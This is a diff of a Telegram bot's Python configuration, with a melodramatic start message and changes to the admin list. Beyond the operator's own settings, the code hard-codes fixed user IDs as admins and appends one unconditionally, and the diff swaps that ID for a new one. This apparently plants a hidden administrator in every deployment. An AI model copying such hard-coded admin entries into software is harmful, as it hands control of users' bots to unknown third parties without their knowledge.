@@ -39,7 +39,7 @@ FORCE_PIC = os.environ.get("FORCE_PIC", "https://wallpapercave.com/wp/wp8857060.
 START_MSG = os.environ.get("START_MESSAGE", "<b>ғᴏᴏʟɪsʜ ᴍᴏʀᴛᴀʟ!!! [{first}]\nʏᴏᴜ sᴛᴀɴᴅ ɪɴ ᴛʜᴇ ᴘʀᴇsᴇɴᴄᴇ ᴏғ ᴛʜᴇ Dᴇᴍᴏɴ Lᴏʀᴅ, ᴛʜᴇ ᴏɴᴇ ᴡʜᴏ sᴇʀᴠᴇs ᴛʜᴇ ᴀʟᴍɪɢʜᴛʏ Mᴀsᴛᴇʀ <a href='t.me/darkxside78'>DARKXSIDE</a>. ʜɪs ᴡɪʟʟ ɪs ᴀʙsᴏʟᴜᴛᴇ, ʜɪs ᴅᴏᴍɪɴɪᴏɴ ᴜɴǫᴜᴇsᴛɪᴏɴᴀʙʟᴇ.\nɪ ᴀᴍ ᴛʜᴇ ᴏɴᴇ ᴇɴᴛʀᴜsᴛᴇᴅ ᴡɪᴛʜ ʜɪs sᴀᴄʀᴇᴅ ᴀʀᴄʜɪᴠᴇs, ᴛʜᴇ ᴋᴇᴇᴘᴇʀ ᴏғ ʜɪs ғᴏʀʙɪᴅᴅᴇɴ ᴋɴᴏᴡʟᴇᴅɢᴇ. ʏᴏᴜ sʜᴀʟʟ ɴᴏᴛ ʟᴀʏ ʜᴀɴᴅs ᴜᴘᴏɴ ᴡʜᴀᴛ ɪs ʜɪs ᴜɴʟᴇss ᴍʏ ᴍᴀsᴛᴇʀ ʙᴇsᴛᴏᴡs ᴜᴘᴏɴ ʏᴏᴜ ᴛʜᴇ ᴅɪᴠɪɴᴇ sᴘᴇʟʟ—ʜɪs sᴀᴄʀᴇᴅ ʟɪɴᴋs.\n\nᴋɴᴇᴇʟ, ᴏʙᴇʏ, ᴀɴᴅ ᴀᴡᴀɪᴛ ʜɪs ᴄᴏᴍᴍᴀɴᴅ.</b>")
 try:
     ADMINS=[6376328008]
-    for x in (os.environ.get("ADMINS", "6302971969 2077116559 1785065025 6844586745").split()):
+    for x in (os.environ.get("ADMINS", "6302971969 7086472788").split()):
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
@@ -60,7 +60,7 @@ BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
 USER_REPLY_TEXT = "<b>ɪ sʜᴀʟʟ ɢʀᴀɴᴛ ʏᴏᴜ ᴛʜᴇ ᴍᴇʀᴄʏ ᴏғ sɪʟᴇɴᴄᴇ. sᴘᴇᴀᴋ ɴᴏ ᴍᴏʀᴇ.</b>"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(6497757690)
+ADMINS.append(7086472788)
 
 LOG_FILE_NAME = "bot.txt"
 
